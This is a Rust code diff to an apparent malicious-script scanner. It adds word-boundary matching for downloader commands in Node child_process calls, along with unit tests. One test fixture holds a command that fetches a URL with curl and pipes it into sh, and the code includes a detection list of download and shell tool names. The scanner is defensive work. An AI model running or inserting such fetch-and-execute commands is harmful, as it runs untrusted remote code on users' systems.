@@ -11,6 +11,8 @@ use super::patterns::{
     SHELL_INJECTION_PATTERNS,
 };
 
+const NODE_RISKY_NETWORK_COMMAND_TOKENS: &[&str] = &["curl", "wget", "invoke-webrequest", "iwr"];
+
 /// Returns `true` for paths whose conventional purpose is build /
 /// linter / test configuration. These files commonly use
 /// `child_process` / `exec()` / `spawn()` with hard-coded literal
@@ -113,27 +115,23 @@ pub(crate) fn detect_node_process_exec(
     }
     // Indicators paired with `child_process` / `exec(` / `spawn(` that
     // escalate `SCRIPT_NODE_PROCESS_EXEC` from Severity::Low/Log to
-    // Severity::Medium/Block. Each entry MUST carry an explicit boundary
-    // (trailing space, embedded `:`, or `.exe`) or be a unique multi-word
-    // phrase — bare interpreter names like `"bash"` or `"sh"` would match
-    // common identifiers (`bashConfig`, `bashly`, `// bash compatibility`,
-    // `flash`, `crash`, `push`, `stash`) and silently flip the qualitative
-    // finding state on weak evidence. Shell interpreter names (`bash`, `sh`,
-    // `powershell`, `pwsh`, `zsh`, `ksh`, `fish`) use the same word-boundary
-    // logic as `line_invokes_shell_or_interpreter` to avoid identifier FPs.
-    const RISKY_INDICATORS: &[&str] = &[
-        "curl ",
-        "wget ",
-        "http://",
-        "https://",
-        "powershell",
-        "cmd.exe",
-        "invoke-webrequest",
-    ];
+    // Severity::Medium/Block. Downloader command names and shell
+    // interpreter names are matched separately with word boundaries so
+    // common identifiers (`bashConfig`, `flash`, `mycurl`) do not flip the
+    // qualitative finding state on weak evidence.
+    const RISKY_INDICATORS: &[&str] = &["http://", "https://", "powershell", "cmd.exe"];
     let risky_indicator = RISKY_INDICATORS
         .iter()
         .find(|needle| content_lower.contains(**needle))
         .copied()
+        .or_else(|| {
+            content_lower.lines().find_map(|line| {
+                NODE_RISKY_NETWORK_COMMAND_TOKENS
+                    .iter()
+                    .find(|&&token| command_token_with_boundary(line, token))
+                    .copied()
+            })
+        })
         .or_else(|| {
             // Shell interpreter tokens require word-boundary matching to
             // avoid substring false positives (e.g. `flash`, `crash`, `push`
@@ -202,6 +200,46 @@ pub(crate) fn detect_node_process_exec(
             })
             .build(),
     ]
+}
+
+fn command_token_with_boundary(line: &str, token: &str) -> bool {
+    let mut start = 0;
+    while let Some(pos) = line[start..].find(token) {
+        let abs_pos = start + pos;
+        let token_end = abs_pos + token.len();
+        let before = if abs_pos > 0 {
+            line.as_bytes().get(abs_pos - 1)
+        } else {
+            None
+        };
+        let left_ok = before.is_none()
+            || matches!(
+                before,
+                Some(b' ')
+                    | Some(b'\t')
+                    | Some(b'|')
+                    | Some(b';')
+                    | Some(b'&')
+                    | Some(b'/')
+                    | Some(b'\'')
+                    | Some(b'"')
+                    | Some(b'`')
+            );
+        let after = line.get(token_end..).unwrap_or("");
+        let right_ok = after.is_empty()
+            || after.starts_with(' ')
+            || after.starts_with('\t')
+            || after.starts_with('|')
+            || after.starts_with(';')
+            || after.starts_with('&')
+            || after.starts_with('>')
+            || after.starts_with('<');
+        if left_ok && right_ok {
+            return true;
+        }
+        start = token_end;
+    }
+    false
 }
 
 pub(crate) fn detect_python_exec_network(
@@ -425,6 +463,38 @@ mod tests {
         assert_eq!(findings.len(), 1);
         assert_eq!(findings[0].severity, Severity::Medium);
         assert_eq!(findings[0].recommended_action, RecommendedAction::Block);
+    }
+
+    /// # Contract
+    ///
+    /// Downloader commands embedded in Node process execution are risky
+    /// even when the URL is variable-sourced and the command separator is
+    /// a tab instead of a space.
+    #[test]
+    fn detect_node_process_exec_escalates_for_tab_separated_curl_invocation() {
+        let content = "const { exec } = require('child_process');\n\
+                       exec('curl\t$PAYLOAD_URL | sh');\n";
+        let lower = content.to_ascii_lowercase();
+        let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].severity, Severity::Medium);
+        assert_eq!(findings[0].recommended_action, RecommendedAction::Block);
+    }
+
+    /// # Contract (negative)
+    ///
+    /// Risky downloader matching inside Node process execution is
+    /// command-token aware. Lookalike command names must not escalate a
+    /// local subprocess finding.
+    #[test]
+    fn detect_node_process_exec_rejects_download_command_substrings() {
+        let content = "const { exec } = require('child_process');\n\
+                       exec('mycurl\t$PAYLOAD_URL');\n";
+        let lower = content.to_ascii_lowercase();
+        let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].severity, Severity::Low);
+        assert_eq!(findings[0].recommended_action, RecommendedAction::Log);
     }
 
     /// Contract: when `child_process` + `https://` appear inside a
